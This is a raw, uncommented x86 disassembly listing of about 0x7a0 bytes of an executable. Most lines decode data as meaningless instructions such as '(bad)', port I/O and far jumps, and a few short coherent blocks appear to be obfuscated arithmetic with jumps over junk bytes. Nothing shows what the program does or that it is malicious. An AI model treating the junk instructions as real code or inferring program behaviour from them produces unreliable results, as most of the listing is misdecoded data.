  409cc3:	(bad)  
  409cc5:	cli    
  409cc6:	cmp    ch,ah
  409cc8:	imul   BYTE PTR [ebp+ebx*4+0x1d]
  409ccc:	cld    
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	icebp  
  409cfa:	rcr    ebp,cl
  409cfc:	std    
  409cfd:	je     0x409ce2
  409cff:	jle    0x409d7f
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	mov    ebx,0x8eb3a097
  409d0a:	lds    esp,FWORD PTR [ebp-0x78]
  409d0d:	sbb    al,0x6f
  409d0f:	jg     0x409cf8
  409d11:	jp     0x409cdb
  409d13:	cdq    
  409d14:	test   DWORD PTR [ecx],ebx
  409d16:	sbb    dh,dl
  409d18:	out    0x68,al
  409d1a:	add    eax,0x61eac1a4
  409d1f:	xor    BYTE PTR [edx],cl
  409d21:	rcr    DWORD PTR [ebp+0x56],1
  409d24:	out    dx,eax
  409d25:	pop    eax
  409d26:	and    DWORD PTR [edi-0x480f51ae],eax
  409d2c:	(bad)  
  409d2d:	imul   ebp,DWORD PTR ds:0xdbd68465,0x34
  409d34:	lea    esi,[ecx]
  409d36:	pop    edx
  409d37:	enter  0xbc85,0x86
  409d3b:	sti    
  409d3c:	jecxz  0x409d23
  409d3e:	push   esp
  409d3f:	mov    BYTE PTR [esi-0x30],al
  409d42:	call   0x173574da
  409d47:	cld    
  409d48:	shl    DWORD PTR [eax],0x85
  409d4b:	hlt    
  409d4c:	cmp    al,0x1e
  409d4e:	sbb    edx,DWORD PTR [ebp-0x35]
  409d51:	fmul   DWORD PTR [edx+0x12]
  409d54:	mov    cs,WORD PTR es:[eax-0x63]
  409d58:	or     ebp,esp
  409d5a:	ins    BYTE PTR es:[edi],dx
  409d5b:	call   0xc68ce5e9
  409d60:	shl    DWORD PTR ds:0xa700a176,cl
  409d66:	xor    DWORD PTR [edi-0x3f],esp
  409d69:	daa    
  409d6a:	ficom  WORD PTR [ecx-0x32d6d7a8]
  409d70:	repz aam 0x60
  409d73:	jmp    0xe66432
  409d78:	mov    dh,0xc6
  409d7a:	nop
  409d7b:	mul    BYTE PTR [edi-0x3d7e208e]
  409d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d83:	inc    edx
  409d84:	scas   eax,DWORD PTR es:[edi]
  409d85:	sbb    dh,dh
  409d87:	lock sbb ecx,edi
  409d8a:	or     dl,BYTE PTR [edi]
  409d8c:	das    
  409d8d:	adc    cl,BYTE PTR [ebx+0x6d]
  409d90:	pop    esp
  409d91:	xor    al,0x61
  409d93:	int3   
  409d94:	xchg   ecx,eax
  409d95:	sbb    DWORD PTR [ecx-0x4f52ed5d],0xffffffeb
  409d9c:	ds inc esi
  409d9e:	adc    dh,bh
  409da0:	and    esi,ecx
  409da2:	add    BYTE PTR [edi-0x52],0x7e
  409da6:	push   0x49
  409da8:	outs   dx,DWORD PTR ds:[esi]
  409da9:	sbb    esp,DWORD PTR [edi-0x7b]
  409dac:	in     al,0x1d
  409dae:	pop    edi
  409daf:	mov    al,ds:0x2e6d993f
  409db4:	ins    DWORD PTR es:[edi],dx
  409db5:	cmp    ah,BYTE PTR [ebp+0x45]
  409db8:	adc    ebp,DWORD PTR [eax+0x75]
  409dbb:	pop    edx
  409dbc:	lea    ebx,[ecx-0x5]
  409dbf:	test   DWORD PTR [eax+0x6a],ecx
  409dc2:	loopne 0x409dfa
  409dc4:	adc    bl,0xe5
  409dc7:	pop    ds
  409dc8:	sbb    BYTE PTR [ebx+esi*2],ch
  409dcb:	rcl    edx,0x3c
  409dce:	lods   eax,DWORD PTR ds:[esi]
  409dcf:	test   BYTE PTR [edx+0x402d861b],0x68
  409dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dd7:	inc    esp
  409dd8:	mov    dh,0x91
  409dda:	mov    al,ds:0x7930d2d2
  409ddf:	jne    0x409e38
  409de1:	(bad)  
  409de2:	aad    0x4
  409de4:	arpl   WORD PTR [ecx-0x62169103],dx
  409dea:	mov    DWORD PTR [esi],edi
  409dec:	outs   dx,BYTE PTR ds:[esi]
  409ded:	cdq    
  409dee:	(bad)  
  409def:	les    esi,FWORD PTR ds:0xd9d7f951
  409df6:	dec    BYTE PTR [ecx+0x3a511a7]
  409dfc:	fucomip st,st(1)
  409dfe:	cmc    
  409dff:	in     eax,dx
  409e00:	fwait
  409e01:	xchg   DWORD PTR [ecx+0x69b5ecc],ecx
  409e07:	mov    esp,DWORD PTR gs:[ebp-0x76cbc766]
  409e0e:	dec    bx
  409e10:	push   edx
  409e11:	mov    WORD PTR [esi+0x296a4e0c],?
  409e17:	test   eax,0xea122cae
  409e1c:	xchg   BYTE PTR [edi],al
  409e1e:	(bad)  
  409e1f:	out    dx,eax
  409e20:	add    ecx,DWORD PTR [ebp+eax*1+0x4d]
  409e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e25:	push   0xcde48f9b
  409e2a:	adc    eax,0xe1407756
  409e2f:	int3   
  409e30:	and    BYTE PTR [eax],ch
  409e32:	inc    ebx
  409e33:	ins    BYTE PTR es:[edi],dx
  409e34:	pushf  
  409e35:	cmp    BYTE PTR [eax],cl
  409e37:	jns    0x409de8
  409e39:	cmp    cl,dh
  409e3b:	sbb    esp,DWORD PTR [ecx-0x1c]
  409e3e:	jnp    0x409dd9
  409e40:	push   esp
  409e41:	addr16 xchg edx,eax
  409e43:	fwait
  409e44:	dec    ebx
  409e45:	lods   eax,DWORD PTR ds:[esi]
  409e46:	and    eax,0x95376a42
  409e4b:	ficomp WORD PTR [ebp+0x2fd4f40e]
  409e51:	and    cl,BYTE PTR [edi]
  409e53:	pop    ds
  409e54:	push   edx
  409e55:	rcl    BYTE PTR fs:[eax+0x36a87ffb],0xf2
  409e5d:	pop    eax
  409e5e:	pop    edx
  409e5f:	sbb    BYTE PTR [ebx-0x57],ah
  409e62:	mov    dh,0xc
  409e64:	arpl   WORD PTR [ebx-0x31c52e41],si
  409e6a:	loopne 0x409df4
  409e6c:	ins    BYTE PTR es:[edi],dx
  409e6d:	test   ah,0x90
  409e70:	cmp    edx,DWORD PTR [edx-0x7263e1da]
  409e76:	xchg   esp,eax
  409e77:	test   DWORD PTR [eax+0x72],ecx
  409e7a:	push   ebp
  409e7b:	(bad)  
  409e7c:	mov    al,0x86
  409e7e:	and    bh,BYTE PTR [edi-0x4e2bbff3]
  409e84:	cdq    
  409e85:	iret   
  409e86:	sub    BYTE PTR [ebx-0x64],cl
  409e89:	enter  0xc7e9,0x7
  409e8d:	jmp    0x7b07:0xb35413f3
  409e94:	adc    dl,BYTE PTR [esi-0x613f7371]
  409e9a:	out    dx,eax
  409e9b:	pop    eax
  409e9c:	sar    BYTE PTR [esi-0x2b],1
  409e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ea0:	ja     0x409eb4
  409ea2:	cmc    
  409ea3:	ins    DWORD PTR es:[edi],dx
  409ea4:	pop    esp
  409ea5:	test   BYTE PTR ds:0xc7cc6ca0,ch
  409eab:	xor    al,0x55
  409ead:	ror    esp,cl
  409eaf:	sbb    bh,BYTE PTR [esi]
  409eb1:	fld    DWORD PTR [ecx]
  409eb3:	sar    BYTE PTR [ebx+eiz*4],1
  409eb6:	add    al,0xc
  409eb8:	sub    esi,edx
  409eba:	jle    0x409e9d
  409ebc:	mov    al,ds:0xf411722a
  409ec1:	or     BYTE PTR [esi+0x10],dh
  409ec4:	mov    esi,0x635a820
  409ec9:	jge    0x409e53
  409ecb:	xor    BYTE PTR [ebx],dh
  409ecd:	in     al,dx
  409ece:	push   ebx
  409ed0:	addr16 cmp cl,0x94
  409ed4:	sar    ch,0xfe
  409ed7:	fmul   st,st(6)
  409ed9:	jg     0x409e74
  409edb:	jb     0x409ef6
  409edd:	sub    edi,DWORD PTR [ecx-0x3]
  409ee0:	jo     0x409e82
  409ee2:	or     dh,BYTE PTR [ecx+0x62]
  409ee5:	dec    ecx
  409ee6:	sar    DWORD PTR ds:0x23dc2834,1
  409eec:	fisttp WORD PTR [edi+0x79c1ea73]
  409ef2:	adc    dl,BYTE PTR [ebp-0x10d65be7]
  409ef8:	sbb    bh,BYTE PTR [edx-0x47]
  409efb:	aad    0xa7
  409efd:	out    dx,al
  409efe:	loop   0x409e92
  409f00:	sbb    al,0x21
  409f02:	mov    esp,0x4241ab78
  409f07:	inc    esi
  409f08:	push   es
  409f09:	out    0xc0,eax
  409f0b:	push   ebp
  409f0c:	dec    esp
  409f0d:	gs sbb eax,0x72719c13
  409f13:	mov    DWORD PTR [ecx+esi*8+0x54],edx
  409f17:	retf   0x551a
  409f1a:	sti    
  409f1b:	daa    
  409f1c:	xchg   BYTE PTR [eax-0x7b],bl
  409f1f:	test   DWORD PTR [edx+edi*4],esi
  409f22:	add    al,0x15
  409f24:	shr    DWORD PTR [esi-0x4298d6e3],0x84
  409f2b:	inc    esp
  409f2c:	push   cs
  409f2d:	iret   
  409f2e:	rcl    BYTE PTR [edi],0xb8
  409f31:	cld    
  409f32:	and    DWORD PTR [esi],eax
  409f34:	repnz or ah,BYTE PTR [eax+0x17]
  409f38:	or     BYTE PTR [ecx-0x50e2230f],bl
  409f3e:	repnz adc eax,0x167521d
  409f44:	xchg   edi,edx
  409f46:	pusha  
  409f47:	not    DWORD PTR [ecx-0x399d5391]
  409f4d:	jae    0x409f0f
  409f4f:	(bad)  
  409f50:	pop    ecx
  409f51:	mov    al,0xcd
  409f53:	aas    
  409f54:	jmp    0x409f4a
  409f56:	inc    esi
  409f57:	pop    ebp
  409f58:	xchg   ecx,eax
  409f59:	shl    DWORD PTR [eax+0xe],cl
  409f5c:	jmp    0x6a17:0x932580f3
  409f63:	xchg   ecx,eax
  409f64:	jbe    0x409f6b
  409f66:	dec    edx
  409f67:	xlat   BYTE PTR ds:[ebx]
  409f68:	mov    ebp,0xf88c5b4f
  409f6d:	mov    esi,0x485db20
  409f72:	(bad)  
  409f73:	fcomi  st,st(1)
  409f75:	jmp    0x23d5:0xcc5b445a
  409f7c:	enter  0x38de,0xb4
  409f80:	arpl   WORD PTR [ebp-0x3f218af8],ax
  409f86:	lods   al,BYTE PTR ds:[esi]
  409f87:	mov    edx,fs
  409f89:	daa    
  409f8a:	int    0xcf
  409f8c:	add    ah,0x16
  409f8f:	lahf   
  409f90:	pop    ecx
  409f91:	sbb    DWORD PTR [ecx+0x9],0xdc4a26ed
  409f98:	pusha  
  409f99:	cld    
  409f9a:	shr    bh,cl
  409f9c:	popf   
  409f9d:	pop    ss
  409f9e:	inc    eax
  409f9f:	test   al,0x29
  409fa1:	jbe    0x409f3e
  409fa3:	pusha  
  409fa4:	sub    eax,0x5c6f3ac9
  409fa9:	push   ebx
  409faa:	cmp    DWORD PTR [ecx-0x1909c1f],eax
  409fb0:	xor    ebx,DWORD PTR [ebx+0x47b73701]
  409fb6:	mov    ds:0xa5882d21,eax
  409fbb:	inc    eax
  409fbc:	sub    ch,BYTE PTR [edx+0x6b]
  409fbf:	dec    edx
  409fc0:	pusha  
  409fc1:	ds dec eax
  409fc3:	push   ebp
  409fc4:	cmp    cl,BYTE PTR [ebx+eiz*2-0x36]
  409fc8:	(bad)  
  409fc9:	loop   0x409f7d
  409fcb:	pop    edi
  409fcc:	sub    eax,0x55025874
  409fd1:	push   ebx
  409fd2:	xchg   esi,eax
  409fd3:	push   ebx
  409fd4:	retf   0x8ff5
  409fd7:	mov    ds:0x83bdc9e0,al
  409fdc:	scas   al,BYTE PTR es:[edi]
  409fdd:	fs aam 0xdb
  409fe0:	repnz cmp al,0x9e
  409fe3:	mov    eax,0xdff546ec
  409fe8:	in     al,dx
  409fe9:	or     eax,0x11a3483f
  409fee:	movq   mm7,mm0
  409ff1:	inc    ebx
  409ff2:	pop    ds
  409ff3:	mov    bh,0xe9
  409ff5:	dec    ebx
  409ff6:	push   es
  409ff7:	loop   0x409fb0
  409ff9:	mov    ebx,0xf1b9eea8
  409ffe:	int    0xe3
  40a000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a001:	pushf  
  40a002:	shl    DWORD PTR [edi+0x10],1
  40a005:	or     al,dh
  40a007:	cmp    al,0xf9
  40a009:	mov    ecx,DWORD PTR [ebp-0x10]
  40a00c:	xor    eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x7e]
  40a02a:	add    ah,BYTE PTR [eax]
  40a02c:	mov    ?,WORD PTR [eax-0x12]
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	push   esi
  40a036:	xor    BYTE PTR [eax-0x4],ah
  40a039:	mov    ebp,0x6b52ec95
  40a03e:	ret    
  40a03f:	test   BYTE PTR [ecx],al
  40a041:	je     0x40a0ab
  40a043:	xor    BYTE PTR [ecx-0x1c],cl
  40a046:	push   cs
  40a047:	xor    dh,bh
  40a049:	mov    dh,0x6b
  40a04b:	and    eax,0xfd216b3
  40a050:	sub    eax,0xad833196
  40a055:	fnstcw WORD PTR [edi-0x6fda4e40]
  40a05b:	jno    0x40a0b5
  40a05d:	mov    eax,0x44b4d68f
  40a062:	dec    esp
  40a063:	jg     0x40a0a0
  40a065:	push   0x4204801b
  40a06a:	leave  
  40a06b:	and    ch,ch
  40a06d:	mov    cs,WORD PTR [edi]
  40a06f:	mov    ebx,0xad45777f
  40a074:	dec    eax
  40a075:	cld    
  40a076:	in     eax,0x58
  40a078:	mov    ebp,ebp
  40a07a:	sbb    al,0xba
  40a07c:	inc    eax
  40a07d:	addr16 inc ebp
  40a07f:	out    dx,al
  40a080:	std    
  40a081:	pop    ebp
  40a082:	sti    
  40a083:	mov    ds:0x27e7ffac,al
  40a088:	xor    ah,al
  40a08a:	loope  0x40a0b1
  40a08c:	mov    dh,0x63
  40a08e:	dec    ecx
  40a08f:	(bad)  
  40a090:	test   al,0x8
  40a092:	int    0xb0
  40a094:	retf   
  40a095:	pop    ecx
  40a096:	add    BYTE PTR [eax-0x6d],ch
  40a099:	in     al,0xa5
  40a09b:	xor    eax,0x225369fe
  40a0a0:	cdq    
  40a0a1:	and    ebx,eax
  40a0a3:	(bad)  
  40a0a4:	push   eax
  40a0a5:	jle    0x40a0a4
  40a0a7:	addr16 mov ch,0x8b
  40a0aa:	sbb    BYTE PTR [esi],ah
  40a0ac:	cdq    
  40a0ad:	sub    dl,dh
  40a0af:	gs dec ebp
  40a0b1:	repz cmp ch,BYTE PTR [esi-0x59]
  40a0b5:	mov    esi,0xca6779ca
  40a0ba:	dec    esp
  40a0bb:	fnstenv [eax-0x2a593f8c]
  40a0c1:	in     al,dx
  40a0c2:	xchg   ebx,eax
  40a0c3:	mov    ebp,0x134dcdf9
  40a0c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0c9:	mov    cl,ch
  40a0cb:	and    eax,0x82496922
  40a0d0:	out    dx,eax
  40a0d1:	and    eax,0xbb20dacf
  40a0d6:	shr    edi,1
  40a0d8:	mov    eax,ds:0xc0ecee9e
  40a0dd:	mov    dl,0xdb
  40a0df:	xor    al,0x5b
  40a0e1:	stos   DWORD PTR es:[edi],eax
  40a0e2:	mov    ebx,0x95feeabd
  40a0e7:	pop    edx
  40a0e8:	dec    ebx
  40a0e9:	xor    eax,0xfc837167
  40a0ee:	or     edi,ecx
  40a0f0:	dec    ecx
  40a0f1:	(bad)  
  40a0f2:	mov    ds:0xfa609914,al
  40a0f7:	and    DWORD PTR [edx-0x20],esi
  40a0fa:	test   BYTE PTR [ecx-0x2c],bl
  40a0fd:	adc    DWORD PTR [edi-0x799a88c],0xcc89fa78
  40a107:	jae    0x40a0a8
  40a109:	dec    eax
  40a10a:	or     ah,dh
  40a10c:	fdiv   st,st(7)
  40a10e:	(bad)  
  40a110:	fidivr WORD PTR [eax]
  40a112:	int3   
  40a113:	push   eax
  40a114:	daa    
  40a115:	sbb    BYTE PTR [ebx+0x29],dl
  40a118:	sbb    DWORD PTR [ebx+0x4ad5e1f0],ebp
  40a11e:	lahf   
  40a11f:	jge    0x40a147
  40a121:	imul   ebp,DWORD PTR [ebx],0xaa7e62eb
  40a127:	mov    eax,ds:0xbc2f5413
  40a12c:	addr16 push 0x5361ce3e
  40a132:	mov    ch,0x6d
  40a134:	int3   
  40a135:	add    eax,0x7d7ba83c
  40a13a:	adc    dl,BYTE PTR ds:0x32e265da
  40a140:	dec    edx
  40a141:	fwait
  40a142:	hlt    
  40a143:	clc    
  40a144:	sar    DWORD PTR [edx+eiz*2],0x6b
  40a148:	ds (bad) 
  40a14a:	and    eax,DWORD PTR [edx]
  40a14c:	cs out dx,eax
  40a14e:	sub    eax,0xa5f289e5
  40a153:	and    dh,BYTE PTR [ebx+0x7d66f1c9]
  40a159:	mov    eax,0x7bf29e51
  40a15e:	dec    ecx
  40a15f:	ret    
  40a160:	test   al,0xc2
  40a162:	jbe    0x40a158
  40a164:	fs dec esp
  40a166:	das    
  40a167:	ja     0x40a17b
  40a169:	cmp    eax,DWORD PTR [edi+0x32]
  40a16c:	mov    eax,ds:0xfa56ad81
  40a171:	lds    esi,FWORD PTR [esi-0x5b6c6b3d]
  40a177:	fcom   DWORD PTR [edi]
  40a179:	sub    ah,BYTE PTR [eax+ebx*2-0x60]
  40a17d:	ja     0x40a124
  40a17f:	(bad)  
  40a180:	mov    dl,0xee
  40a182:	sar    DWORD PTR [edx+eax*4-0x2bb209fe],cl
  40a189:	cdq    
  40a18a:	adc    eax,0x7f34c3db
  40a18f:	push   es
  40a190:	mov    ch,BYTE PTR [esi]
  40a192:	sbb    dh,BYTE PTR [edi]
  40a194:	pop    ds
  40a195:	les    ebx,FWORD PTR [eax-0x5bdb025]
  40a19b:	pop    esi
  40a19c:	(bad)  
  40a19d:	cld    
  40a19e:	loopne 0x40a16b
  40a1a0:	(bad)  
  40a1a1:	cmp    ah,BYTE PTR [ecx+ecx*1-0x27]
  40a1a5:	aaa    
  40a1a6:	enter  0x8e21,0x3d
  40a1aa:	js     0x40a17f
  40a1ac:	xchg   esp,eax
  40a1ad:	sbb    BYTE PTR [ebx-0x12],0x77
  40a1b1:	push   0x6
  40a1b3:	fwait
  40a1b4:	test   eax,0x26f7410d
  40a1b9:	iret   
  40a1ba:	adc    ch,BYTE PTR [ebx+ebp*8]
  40a1bd:	dec    eax
  40a1be:	jns    0x40a22e
  40a1c0:	push   ds
  40a1c1:	in     al,dx
  40a1c2:	mov    ecx,esi
  40a1c4:	sub    ecx,esp
  40a1c6:	cld    
  40a1c7:	cmp    ecx,0x8fbb2613
  40a1cd:	nop
  40a1ce:	inc    ecx
  40a1cf:	or     BYTE PTR [ebx+0x868dc8],bh
  40a1d5:	cmp    DWORD PTR [ebp-0x3844080f],esi
  40a1db:	dec    ebx
  40a1dc:	icebp  
  40a1dd:	jb     0x40a1a2
  40a1df:	mov    dl,0xe6
  40a1e1:	dec    edi
  40a1e2:	mov    dl,0xda
  40a1e4:	push   edi
  40a1e5:	jae    0x40a197
  40a1e7:	aad    0x86
  40a1e9:	ds mov al,0xa2
  40a1ec:	es lock inc esp
  40a1ef:	adc    bh,BYTE PTR [ecx]
  40a1f1:	sub    BYTE PTR [ebx+0x34edd4e7],bh
  40a1f7:	jmp    0x77d9:0x4ff14cab
  40a1fe:	clc    
  40a1ff:	add    al,0x2c
  40a201:	push   es
  40a202:	popf   
  40a203:	mov    ch,0xab
  40a205:	inc    edx
  40a206:	push   es
  40a207:	or     dh,BYTE PTR [ecx-0x58]
  40a20a:	inc    eax
  40a20b:	int3   
  40a20c:	inc    edx
  40a20d:	jmp    0x40a25e
  40a20f:	jmp    0x4b09e058
  40a214:	pop    ebx
  40a215:	xor    eax,0x966bcdcd
  40a21a:	call   FWORD PTR [edi+eiz*2-0xf]
  40a21e:	push   ebx
  40a21f:	mov    ecx,0xbcafba59
  40a224:	inc    edx
  40a225:	jns    0x40a21b
  40a227:	cs dec ebp
  40a229:	and    eax,0xf5727fd2
  40a22e:	adc    BYTE PTR [edx],bl
  40a230:	jmp    0xc774:0xb1fa9855
  40a237:	inc    ecx
  40a238:	lahf   
  40a239:	or     al,0xc
  40a23b:	pusha  
  40a23c:	add    al,0x56
  40a23e:	xor    BYTE PTR [ecx+0x37],dl
  40a241:	dec    esi
  40a242:	push   esp
  40a243:	outs   dx,DWORD PTR ds:[esi]
  40a244:	sub    DWORD PTR [ecx],ebx
  40a246:	add    bl,BYTE PTR [esi-0x3b]
  40a249:	mov    eax,ds:0x9eb46482
  40a24e:	mov    edx,0x1c34e350
  40a253:	xor    bl,BYTE PTR [ecx-0x77]
  40a256:	xor    al,BYTE PTR [ebx+eax*1-0x3a]
  40a25a:	add    esp,ecx
  40a25c:	jo     0x40a225
  40a25e:	in     al,dx
  40a25f:	dec    ebx
  40a260:	push   0xffffffd3
  40a262:	xor    DWORD PTR [ebp+ebx*1-0x7a],ebp
  40a266:	jg     0x40a1fc
  40a268:	test   eax,0x1c860a14
  40a26d:	ror    DWORD PTR [ebx+0x7a1b875f],0x2e
  40a274:	ffreep st(0)
  40a276:	dec    edi
  40a277:	in     al,dx
  40a278:	test   DWORD PTR [edi],ebp
  40a27a:	adc    al,0xab
  40a27c:	mov    edi,gs
  40a27e:	mov    ah,0xc5
  40a280:	das    
  40a281:	fcmovnu st,st(6)
  40a283:	pop    esp
  40a284:	mov    ebp,0x1b167b5d
  40a289:	(bad)  
  40a28a:	aam    0xa8
  40a28c:	adc    DWORD PTR [ebp+0x53b69a50],ecx
  40a292:	jmp    0xca61:0x5308f860
  40a299:	push   ds
  40a29a:	or     BYTE PTR [edi+0x8],bl
  40a29d:	scas   al,BYTE PTR es:[edi]
  40a29e:	fwait
  40a29f:	pop    esi
  40a2a0:	(bad)  
  40a2a1:	dec    ecx
  40a2a3:	push   0x61
  40a2a5:	adc    bl,BYTE PTR [edx-0x4b]
  40a2a8:	or     ah,cl
  40a2aa:	cs mov ch,0xed
  40a2ad:	ss out 0x4b,eax
  40a2b0:	mov    ah,0x50
  40a2b2:	sahf   
  40a2b3:	xchg   edi,eax
  40a2b4:	hlt    
  40a2b5:	pop    ds
  40a2b6:	cmc    
  40a2b7:	mov    esi,0xc99e100c
  40a2bc:	xchg   esp,edi
  40a2be:	sahf   
  40a2bf:	sub    BYTE PTR [eax-0x53],dl
  40a2c2:	sub    ebx,esi
  40a2c4:	ja     0x40a2b1
  40a2c6:	out    dx,eax
  40a2c7:	dec    eax
  40a2c8:	dec    esp
  40a2c9:	xchg   esi,eax
  40a2ca:	cli    
  40a2cb:	pop    ebx
  40a2cc:	xchg   esp,eax
  40a2cd:	sub    ch,al
  40a2cf:	sub    eax,DWORD PTR [ecx+0x65]
  40a2d2:	push   cs
  40a2d3:	xchg   esp,eax
  40a2d4:	cdq    
  40a2d5:	xchg   edi,eax
  40a2d6:	scas   al,BYTE PTR es:[edi]
  40a2d7:	pop    edx
  40a2d8:	fcmovnb st,st(6)
  40a2da:	ins    BYTE PTR es:[edi],dx
  40a2db:	mov    eax,0xc34979dc
  40a2e0:	iret   
  40a2e1:	mov    ah,0x63
  40a2e3:	push   esp
  40a2e4:	inc    ebp
  40a2e5:	lea    ecx,[esi-0x1373299e]
  40a2eb:	push   ebx
  40a2ec:	and    DWORD PTR [esi],edi
  40a2ee:	loopne 0x40a300
  40a2f0:	pop    ds
  40a2f1:	and    bh,BYTE PTR [edx+esi*4-0x1c]
  40a2f5:	jae    0x40a326
  40a2f7:	xor    cl,ch
  40a2f9:	mov    ds:0x3645851a,eax
  40a2fe:	push   ecx
  40a2ff:	test   al,0xa9
  40a301:	loope  0x40a2f1
  40a303:	std    
  40a304:	cmp    al,0x63
  40a306:	aad    0x50
  40a308:	add    DWORD PTR [esi+0x64969c7b],eax
  40a30e:	jo     0x40a2f8
  40a310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a311:	pop    ds
  40a312:	clc    
  40a313:	pop    esi
  40a314:	xlat   BYTE PTR ds:[ebx]
  40a315:	js     0x40a2a3
  40a317:	lock ds pusha 
  40a31a:	sbb    edx,DWORD PTR [edx-0x49eca958]
  40a320:	fs mov edi,0xf83c447a
  40a326:	xor    bl,ah
  40a328:	sub    eax,0xea802728
  40a32d:	cmp    edx,DWORD PTR [edi-0x677431cf]
  40a333:	cmp    BYTE PTR [eax],bl
  40a335:	aam    0x72
  40a337:	(bad)  
  40a339:	xor    ecx,esi
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	(bad)  
  40a3cc:	loope  0x40a398
  40a3ce:	test   al,0x7c
  40a3d0:	jmp    0x7e7e:0x7d7a7e7e
  40a3d7:	imul   ebp,ecx,0x74
  40a3da:	mov    al,ds:0xca479f10
  40a3df:	js     0x40a392
  40a3e1:	ret    
  40a3e2:	repz and ah,BYTE PTR [ecx-0x52bc6eab]
  40a3e9:	aaa    
  40a3ea:	jl     0x40a385
  40a3ec:	lods   eax,DWORD PTR ds:[esi]
  40a3ed:	mov    esp,0xcbc9036
  40a3f2:	xchg   BYTE PTR [ebp+0x313c2870],ch
  40a3f8:	mov    al,0x7b
  40a3fa:	fistp  WORD PTR [eax-0x30]
  40a3fd:	xlat   BYTE PTR ds:[ebx]
  40a3fe:	push   ds
  40a3ff:	leave  
  40a400:	ror    al,1
  40a402:	mov    dh,0x97
  40a404:	repnz mov dh,0x3c
  40a407:	adc    al,0xd9
  40a409:	aam    0xc4
  40a40b:	jge    0x40a457
  40a40d:	(bad)  
  40a40e:	push   eax
  40a40f:	sub    cl,BYTE PTR [eax]
  40a411:	mov    ebx,DWORD PTR [ebx-0x34afaf55]
  40a417:	mov    al,0x7e
  40a419:	and    bh,BYTE PTR [ebx]
  40a41b:	dec    esp
  40a41c:	call   0x6345:0xd6cb0d4b
  40a423:	dec    eax
  40a424:	cli    
  40a425:	call   0x8463:0x3ef4796d
  40a42c:	xchg   ebx,eax
  40a42d:	inc    esi
  40a42e:	xor    ecx,DWORD PTR [esi-0x3b682534]
  40a434:	mov    eax,0x2b7ff2e2
  40a439:	inc    ebp
  40a43a:	inc    eax
  40a43b:	out    dx,eax
  40a43c:	pusha  
  40a43d:	out    0xb3,al
  40a43f:	sbb    bh,BYTE PTR [ebp+0x9]
  40a442:	pop    edi
  40a443:	test   BYTE PTR [ebx+0x68],ah
  40a446:	test   DWORD PTR [esi-0x23f25866],edi
  40a44c:	mov    DWORD PTR [esp+edi*2],edi
  40a44f:	xchg   esp,eax
  40a450:	hlt    
  40a451:	(bad)  
  40a452:	adc    edi,DWORD PTR [ecx+0x14]
  40a455:	push   cs
  40a456:	xor    eax,0xca14a6ce
  40a45b:	test   BYTE PTR [ebx+0x23e99af7],cl
  40a461:	unpckhps xmm4,XMMWORD PTR [edi]
  40a464:	pop    ecx
  40a465:	mov    cl,0x3b
  40a467:	push   cs
  40a468:	test   eax,0xb987a45b
  40a46d:	adc    eax,0x16a880d6
